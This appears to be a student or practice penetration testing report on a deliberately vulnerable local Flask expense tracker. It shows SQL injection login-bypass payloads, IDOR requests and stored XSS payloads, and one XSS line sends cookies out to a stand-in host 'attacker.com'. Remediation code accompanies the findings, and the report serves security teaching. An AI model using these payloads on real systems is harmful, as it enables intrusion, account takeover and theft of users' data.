# Penetration Testing Report
## Expense Tracker Web Application

---

### Document Information

**Application Name:** Expense Tracker  
**Test Date:** February 6, 2026
**Tester:** Mugeha Jackline  
**Version Tested:** 1.0  
**Test Type:** White-box web application security assessment  
**Tools Used:** Burp Suite Community Edition, Manual Testing  

---

## Executive Summary

A security assessment was conducted on the Expense Tracker web application to identify vulnerabilities and security weaknesses. The testing revealed **3 critical and 1 high-severity vulnerabilities** that could allow attackers to:

- Bypass authentication and gain unauthorized access
- Access and modify other users' financial data
- Execute malicious JavaScript in users' browsers
- Hijack user sessions

### Risk Rating Summary

| Severity | Count | Vulnerabilities |
|----------|-------|----------------|
| **Critical** | 2 | SQL Injection (Login), SQL Injection (Registration) |
| **Critical** | 1 | Business logic (add-expense endpoint) |
| **High** | 2 | IDOR, Stored XSS |
| **Medium** | 1 | Weak Session Configuration |
| **Low** | 3 | Missing Security Headers |


### Recommendations Priority

1. **Immediate (Critical):** Fix SQL injection vulnerabilities
2. **High Priority:** Implement authorization checks (IDOR)
3. **High Priority:** Sanitize user input (XSS)
4. **Medium Priority:** Secure session configuration
5. **Low Priority:** Add security headers

---

## Scope

### In-Scope
- Authentication mechanisms (login, registration, logout)
- Session management
- Expense CRUD operations
- Authorization controls
- Input validation
- Client-side security

### Out-of-Scope
- Infrastructure security
- DDoS resilience
- Physical security
- Social engineering

### Testing Methodology
- **Manual testing:** Burp Suite proxy, request manipulation
- **Automated scanning:** Burp Suite passive scanner
- **Authentication testing:** Bypass attempts, session analysis
- **Authorization testing:** IDOR, privilege escalation
- **Input validation:** SQL injection, XSS, special characters

---
Overall walkthrough of the application revealed certain endpoints
- ![Endpoint enumeration](.\vulnerable-expense-tracker\Screenshots\Site map.png)

## Detailed Findings

---

### Finding #1: SQL Injection in Login Form

**Severity:** 🔴 CRITICAL  
**CVSS Score:** 9.8 (Critical)  
**CWE:** CWE-89 (SQL Injection)  

#### Description
The login functionality is vulnerable to SQL injection attacks due to unsanitized user input being concatenated directly into SQL queries. An attacker can bypass authentication and gain unauthorized access to any account.

#### Technical Details

**Vulnerable Code Location:**
- File: `app.py`
- Function: `login()`
- Line: `query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"`

**Attack Vector:**
```
Username: testuser
Password: ' OR '1'='1
```

**Resulting SQL Query:**
```sql
SELECT * FROM users WHERE username = 'testuser' AND password = '' OR '1'='1'
```

#### Proof of Concept

**Step 1: Intercepted Request (Burp Suite)**
```http
POST /login HTTP/1.1
Host: 127.0.0.1:5000
Content-Type: application/x-www-form-urlencoded

username=testuser&password=' OR '1'='1
```

**Step 2: Server Response**
```http
HTTP/1.1 302 FOUND
Location: /dashboard
Set-Cookie: session=eyJ1c2VyX2lkIjoxfQ...
```

**Result:** Successfully authenticated without valid credentials

**Screenshots:**
- ![Normal login interface with login details](.\vulnerable-expense-tracker\Screenshots\normal login interface with login details.png)
- ![Normal login intercept](.\vulnerable-expense-tracker\Screenshots\normal login intercept.png)
- ![SQL Injection in Burp](.\vulnerable-expense-tracker\Screenshots\sql injection.png)

#### Impact
- **Authentication Bypass:** Attackers can log in as any user without knowing passwords
- **Data Breach:** Access to all user financial data
- **Account Takeover:** Complete control of any account
- **Data Manipulation:** Ability to modify or delete data
- **Potential Database Extraction:** Using UNION-based SQL injection

#### Remediation

**Immediate Fix: Use Parameterized Queries**
```python
# Replace vulnerable code with:
query = "SELECT * FROM users WHERE username = ? AND password = ?"
user = cursor.execute(query, (username, password)).fetchone()
```

**Additional Recommendations:**
1. Implement password hashing (bcrypt)
2. Add rate limiting on login attempts
3. Log failed authentication attempts
4. Implement account lockout after failed attempts

---

### Finding #2: SQL Injection in Registration Form

**Severity:** 🔴 CRITICAL  
**CVSS Score:** 9.1 (Critical)  
**CWE:** CWE-89 (SQL Injection)  

#### Description
Similar to the login form, the registration endpoint is vulnerable to SQL injection, allowing attackers to manipulate the registration process or extract database information.

#### Technical Details

**Vulnerable Code Location:**
- File: `app.py`
- Function: `register()`
- Line: `query = f"INSERT INTO users (username, password) VALUES ('{username}', '{password}')"`

**Attack Vector:**
```
Username: attacker')--
Password: (anything)
```

#### Proof of Concept

**Payload:**
```
username=admin')--&password=ignored
```

**Resulting Query:**
```sql
INSERT INTO users (username, password) VALUES ('admin')--', 'ignored')
```

**Result:** Creates user with username `admin')--`, but demonstrates SQL injection vulnerability.

#### Impact
- Database manipulation
- Potential for second-order SQL injection
- Data integrity compromise

#### Remediation
Same as Finding #1 - use parameterized queries.

---


### Finding #3: Business Logic
**Severity:** 🔴 Critical  
**CVSS Score:** 9.5 (Critical)  
#### Description
I added an expense with a negative value and it got updated
![Business logic flaw](.\vulnerable-expense-tracker\Screenshots\negative value.png)
![](.\vulnerable-expense-tracker\Screenshots\negative amount updated.png)
### Finding #4: Insecure Direct Object Reference (IDOR)

**Severity:** 🟠 HIGH  
**CVSS Score:** 7.5 (High)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)  

#### Description
The `/expense/<id>` endpoint does not verify that the requested expense belongs to the authenticated user. Any logged-in user can view any expense by manipulating the `id` parameter in the URL.

#### Technical Details

**Vulnerable Code Location:**
- File: `app.py`
- Function: `view_expense(expense_id)`
- Missing check: `AND user_id = ?`

**Attack Vector:**
1. Attacker logs in (user_id = 2)
2. Attacker navigates to `/expense/1` (belongs to user_id = 1)
3. Expense details are displayed despite belonging to different user

#### Proof of Concept

**Test Setup:**
- User testUser (ID=1) creates expenses (IDs: 1, 2, 3)
- User Attacker (ID=2) creates expense (ID: 4)
- User Attacker logs in

**Attack Steps:**
1. As User Attacker, visit: `http://127.0.0.1:5000/expense/1`
2. Successfully view User testuser's expense

**Burp Suite Request:**
```http
GET /expense/1 HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=eyJ1c2VyX2lkIjoyfQ...
```

**Response:**
```http
HTTP/1.1 200 OK

<table>
  <tr><th>User ID</th><td>1</td></tr>  <!-- Not user 2! -->
  <tr><th>Description</th><td>User testuser's private expense</td></tr>
</table>
```

**Screenshots:**
- ![IDOR - normal fetching of expense](vulnerable-expense-tracker\Screenshots\normal fetching of expense.png)
- ![IDOR - intercepting request in burp](vulnerable-expense-tracker\Screenshots\intercepting request in burp.png)
- ![IDOR - Accessing Other User's Data](.\vulnerable-expense-tracker\Screenshots\able to access another user's expense.png)

#### Impact
- **Privacy Breach:** Complete exposure of all users' financial data
- **Data Enumeration:** Attackers can iterate through all expense IDs
- **Compliance Violation:** GDPR, PCI-DSS violations
- **Reputational Damage:** Loss of user trust

#### Remediation

**Add Authorization Check:**
```python
expense = conn.execute(
    "SELECT * FROM expenses WHERE id = ? AND user_id = ?",
    (expense_id, session['user_id'])
).fetchone()

if not expense:
    return "Expense not found or access denied", 403
```

---

### Finding #5: Stored Cross-Site Scripting (XSS)

**Severity:** 🟠 HIGH  
**CVSS Score:** 7.1 (High)  
**CWE:** CWE-79 (Cross-site Scripting)  

#### Description
The expense description field is vulnerable to stored XSS. Malicious JavaScript code entered in the description is stored in the database and executed when any user views the expense.

#### Technical Details

**Vulnerable Code Locations:**
1. **Storage:** `app.py` - `add_expense()` function (no input sanitization)
2. **Execution:** `view_expense.html` - `{{ expense.description | safe }}`

**Attack Vector:**
```html
<script>alert('XSS')</script>
```

#### Proof of Concept

**Step 1: Create Malicious Expense**
```http
POST /add-expense HTTP/1.1
Host: 127.0.0.1:5000
Cookie: session=...

description=<script>alert(document.cookie)</script>&amount=5.00&date=2026-02-06
```

**Step 2: View Expense**
When any user views this expense, the JavaScript executes, displaying their session cookie.

**Advanced Attack - Session Hijacking:**
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**Screenshots:**
- ![XSS Payload Injection](.\vulnerable-expense-tracker\Screenshots\xss.png)
- ![XSS Execution](.\vulnerable-expense-tracker\Screenshots\xss executed.png)

#### Impact
- **Session Hijacking:** Steal session cookies → account takeover
- **Credential Theft:** Inject fake login forms
- **Malware Distribution:** Redirect to malicious sites
- **Phishing:** Display fake messages/forms
- **Persistent Threat:** Affects all users who view the expense

#### Remediation

**1. Remove `| safe` filter:**
```html
<!-- Change from: -->
<td>{{ expense.description | safe }}</td>

<!-- To: -->
<td>{{ expense.description }}</td>
```

**2. Sanitize on input:**
```python
from markupsafe import escape

description = escape(request.form['description'])
```

**3. Implement Content Security Policy:**
```python
response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'"
```

---

### Finding #6: Weak Session Configuration

**Severity:** 🟡 MEDIUM  
**CVSS Score:** 5.3 (Medium)  
**CWE:** CWE-330 (Use of Insufficiently Random Values)  

#### Description
The application uses a hardcoded, predictable secret key for session management, and cookies lack security flags.
Browser cookies being expose in developer tools

#### Technical Details

**Issues Found:**
1. **Hardcoded Secret Key:** `app.secret_key = 'super_secret_key_123'`
2. **Missing httpOnly flag:** Allows JavaScript access to session cookies
3. **Missing Secure flag:** Cookies sent over unencrypted connections
4. **Missing SameSite:** Vulnerable to CSRF attacks

#### Proof of Concept

**Cookie Theft via XSS:**
```javascript
// In browser console:
document.cookie
// Result: "session=eyJ1c2VyX2lkIjoxfQ..."
// Cookie is accessible! Should be httpOnly
```
![Browser showing cookies](.\vulnerable-expense-tracker\Screenshots\browser showing cookies.png)
#### Impact
- **Session Prediction:** Weak secret key allows session forgery
- **XSS Amplification:** Stolen cookies via XSS lead to account takeover
- **Session Fixation:** Easier session manipulation

#### Remediation
```python
import os

# Use environment variable or generate random key
app.secret_key = os.environ.get('SECRET_KEY') or os.urandom(24)

# Secure cookie configuration
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = True  # In production with HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
```

---

### Finding #7-8: Missing Security Headers

**Severity:** 🔵 LOW  
**Impact:** Informational / Defense in Depth  

#### Missing Headers:
1. **X-Content-Type-Options:** Missing (allows MIME sniffing)
2. **X-Frame-Options:** Missing (allows clickjacking)
3. **Content-Security-Policy:** Missing (doesn't restrict content sources)

#### Remediation
```python
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response
```

---

## Burp Suite Analysis

### What Burp Suite Detected

**Passive Scanner Findings:**
- Missing security headers (correctly identified)
- Insecure cookie configuration (correctly identified)
- Verbose error messages

**What Burp Suite Missed (Community Edition):**
- SQL Injection (requires manual testing or Pro)
- IDOR (business logic, requires manual analysis)
- Stored XSS (requires active scanning or manual testing)
- Password complexity issues
- Business logic flaws

### Key Insight
**Automated tools are helpful but insufficient.** The most critical vulnerabilities (SQL injection, IDOR, XSS) required manual testing and understanding of application logic.

---

## Testing Evidence

### Screenshots Directory Structure
```
screenshots/
├── able to access another user's expense.png
├── browser showing cookies.png
├── intercepting request in burp.png
├── normal fetching of expense.png
├── normal login intercept.png
├── normal login interface with login details.png
└── Site map.png
|__sql injection.png
|__xss executed.png
|__xss.png
|__negative value.png
|__negative amount updated.png
```

---

## Remediation Summary

### Immediate Actions (Critical - Within 24 hours)
1. Implement parameterized queries for all SQL operations
2. Add authorization checks (user_id verification)

### High Priority (Within 1 week)
3. Remove `| safe` filter and sanitize inputs
4. Implement secure session configuration
5. Add password hashing (bcrypt)

### Medium Priority (Within 2 weeks)
6. Add security headers
7. Implement CSRF protection
8. Add rate limiting

### Low Priority (Within 1 month)
9. Comprehensive input validation
10. Security logging and monitoring

---

## Conclusion

The Expense Tracker application contains several critical security vulnerabilities that pose significant risk to user data and system integrity. The most severe issues are SQL injection vulnerabilities that allow complete authentication bypass and database manipulation.

**Positive Findings:**
- Well-structured code (easy to patch)
- Clear separation of concerns
- Good foundation for security improvements

**Critical Gaps:**
- No input validation or sanitization
- Missing authorization controls
- Insecure session management

**Recommendation:** Address critical and high-severity findings immediately before any production deployment. All identified vulnerabilities have straightforward fixes that can be implemented quickly.

---

**Report Prepared By:** Mugeha Jackline  
**Date:** February 6, 2026  

---

### Appendix A: Tool Versions
- Burp Suite Community Edition v2023.x
- Python 3.x
- Flask 3.x
- SQLite 3.x

### Appendix B: References
- OWASP Top 10 2021
- CWE/SANS Top 25
- OWASP Testing Guide v4.2